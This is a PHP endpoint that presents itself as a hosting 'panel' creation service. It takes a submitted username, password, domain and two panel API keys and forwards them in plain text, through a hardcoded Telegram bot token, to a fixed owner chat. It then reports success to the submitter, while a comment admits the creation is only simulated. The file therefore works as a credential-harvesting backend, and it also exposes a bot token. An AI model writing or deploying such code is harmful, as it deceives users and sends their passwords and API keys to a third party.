<?php
header('Content-Type: application/json');

// Get POST data
$data = json_decode(file_get_contents('php://input'), true);

// Validate data
if (empty($data)) {
    echo json_encode(['success' => false, 'message' => 'No data received']);
    exit;
}

// Prepare data for Telegram
$telegramMessage = "New " . ($data['type'] === 'panel' ? 'Panel' : 'Admin Panel') . " Created:\n";
$telegramMessage .= "Username: " . $data['username'] . "\n";
$telegramMessage .= "Password: " . $data['password'] . "\n";
if ($data['type'] === 'panel') {
    $telegramMessage .= "RAM: " . $data['ram'] . ($data['ram'] === 'unli' ? '' : 'GB') . "\n";
}
$telegramMessage .= "Telegram ID: " . $data['telegramId'] . "\n";
$telegramMessage .= "Domain: " . $data['domain'] . "\n";
$telegramMessage .= "API PLTA: " . $data['api_plta'] . "\n";
$telegramMessage .= "API PLTC: " . $data['api_pltc'] . "\n";

// Send to owner (7849712634)
sendToTelegram($telegramMessage, '7849712634');

// Send to user's Telegram ID if different from owner
if ($data['telegramId'] != '7849712634') {
    sendToTelegram("Your panel has been created successfully!", $data['telegramId']);
}

// Function to send message via Telegram bot
function sendToTelegram($message, $chatId) {
    $botToken = '8081519323:AAGoTfh5TIC-TznGmfBYeFKNnpQDMNl-AxM';
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

// Simulate panel creation (in a real app, you would create actual resources)
$response = [
    'success' => true,
    'message' => ($data['type'] === 'panel' ? 'Panel' : 'Admin panel') . ' created successfully!',
    'data' => $data
];

echo json_encode($response);
?>
